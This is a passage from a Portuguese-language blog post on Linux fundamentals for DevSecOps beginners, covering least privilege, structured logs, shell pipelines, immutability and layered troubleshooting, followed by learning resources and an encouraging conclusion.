- **Quem** é o dono?
- **Quem** pode acessar?
- **O que** pode ser feito?

Permissões, usuários, grupos, capabilities — tudo isso forma camadas de defesa. Um sistema bem configurado é aquele onde cada componente tem **exatamente** o acesso que precisa, nada mais.

### 2. Logs são eventos estruturados

Logs não são apenas texto. São **eventos** com:
- Timestamp
- Severidade (INFO, WARN, ERROR, CRITICAL)
- Contexto (onde aconteceu, quem fez, o quê)

Saber extrair informação de logs é **crítico**. Toda vez que algo quebra em produção, a resposta está nos logs — você só precisa saber onde procurar.

### 3. O sistema é composável

A beleza do Linux está na capacidade de combinar ferramentas simples para resolver problemas complexos:

```bash
# Não precisa de ferramenta especial para analisar logs
# Combine grep, awk, sort, uniq
cat access.log | grep "500" | awk '{print $7}' | sort | uniq -c
```

Pipes, redirecionamento, subshells — essas construções resolvem 90% dos problemas do dia a dia. Aprenda a pensar em termos de **transformação de dados**.

### 4. Imutabilidade é segurança

Quanto menos você permite modificar, mais seguro fica:
- Containers com filesystem read-only
- Configurações versionadas (GitOps)
- Políticas de SELinux/AppArmor
- Permissões restritivas por padrão

### 5. Aprenda a pensar em camadas

Quando algo quebra, você precisa navegar a stack:

```markdown
Aplicação (código)
    ↓
Runtime (Python, Node, JVM)
    ↓
Userspace (systemd, processos)
    ↓
Kernel (drivers, syscalls)
    ↓
Hardware (CPU, disco, rede)
```

Problema de rede? Pode ser firewall (kernel), pode ser DNS (userspace), pode ser código (aplicação). Saber **onde** investigar economiza horas de debugging.

---

## Recursos para continuar aprendendo

**Documentação oficial:**
- `man [comando]` — manual de qualquer comando
- `/usr/share/doc` — documentação instalada localmente

**Prática:**
- Suba uma VM com Ubuntu/Debian
- Instale Docker e explore containers
- Configure um servidor web simples (Nginx)
- Quebre coisas propositalmente e aprenda a consertar

---

## Conclusão

Se você chegou até aqui, parabéns. Você acabou de percorrer conceitos que levei anos para entender uma parte.

A diferença entre um profissional júnior e um sênior não está em quantos comandos ele decorou. Está em:
- Entender **por que** as coisas funcionam como funcionam
- Saber **onde** procurar quando algo quebra
- Ter **intuição** sobre o que pode estar errado
- Conhecer a **arquitetura** do sistema por baixo dos panos

Linux não é difícil. Linux é **diferente**. Exige uma mudança de mentalidade. Mas uma vez que você entende os fundamentos, o resto é consequência.

Se você precisa do `man` para comandos básicos, ainda está aprendendo — e tudo bem. Mas se consegue construir pipelines complexos de análise sem Google, entender mensagens de erro obscuras, e debugar sistemas em produção com confiança?

**Você está no caminho certo.**

Agora vai lá e bota a mão na massa. A melhor forma de aprender Linux é quebrando e consertando.

E lembre-se: todo mundo que é bom em Linux hoje ou já deu um `rm -rf` errado algum dia ou travou todo o sistema com uma aplicação. 
A diferença é que aprendemos com os erros.

---

**Gostou do conteúdo? Compartilhe com quem está começando em DevSecOps.**  
**Tem dúvidas ou sugestões? Me chama no LinkedIn.**
**Comenta abaixo para eu ver o que vocês estão pensando**